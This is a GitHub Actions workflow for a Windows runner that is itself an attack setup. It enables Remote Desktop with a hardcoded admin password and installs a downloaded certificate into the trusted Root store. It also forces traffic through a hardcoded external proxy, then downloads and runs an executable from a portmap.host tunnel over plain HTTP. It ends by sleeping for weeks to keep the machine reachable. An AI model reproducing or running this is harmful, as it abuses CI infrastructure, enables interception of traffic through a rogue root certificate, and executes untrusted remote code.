name: last

on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: windows-latest

    steps:
      # Enable Remote Desktop (RDP) connections
      - name: Enable TS
        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

      # Enable the firewall rule for Remote Desktop
      - name: Enable Firewall Rule
        run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

      # Set User Authentication for RDP
      - name: Set User Authentication
        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1

      # Set admin password for runner user
      - name: Set Runner Admin Password
        run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)

      # Download the Sys.pfx certificate file
      - name: Download Sys.pfx Certificate
        run: Invoke-WebRequest -Uri "https://github.com/snikms/torbo/raw/refs/heads/main/Sys.pfx" -OutFile "C:\Windows\System32\Sys.pfx"

      # Install the certificate using its password (028458)
      - name: Install Sys.pfx Certificate
        run: |
          $pfxPassword = ConvertTo-SecureString -String "028458" -AsPlainText -Force
          $pfxFile = "C:\Windows\System32\Sys.pfx"
          $certStore = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root", "LocalMachine")
          $certStore.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
          $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
          $cert.Import($pfxFile, $pfxPassword, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::MachineKeySet)
          $certStore.Add($cert)
          $certStore.Close()

      # Configure the system to use the proxy
      - name: Set System Proxy
        run: |
          netsh winhttp set proxy "193.161.193.99:48122"

      # Download the batch file (run.exe)
      - name: Download Batch File
        run: Invoke-WebRequest -Uri "http://xama1-63478.portmap.host:63478/run.exe" -OutFile run.exe

      # Execute the batch file (run.exe)
      - name: Execute Batch File
        run: |
          Start-Process -FilePath "run.exe"
          while (Get-Process | Where-Object { $_.ProcessName -eq "run" }) {
              Start-Sleep -Seconds 5
          }

      # Open CMD and run the secret command
      - name: Open CMD and Run Secret Command
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
        run: |
          Start-Process -FilePath "cmd.exe" -ArgumentList "/k %MY_SECRET%"

      # Keep connection alive
      - name: Keep connection alive for unlimited hours
        run: Start-Sleep -Seconds 2147483
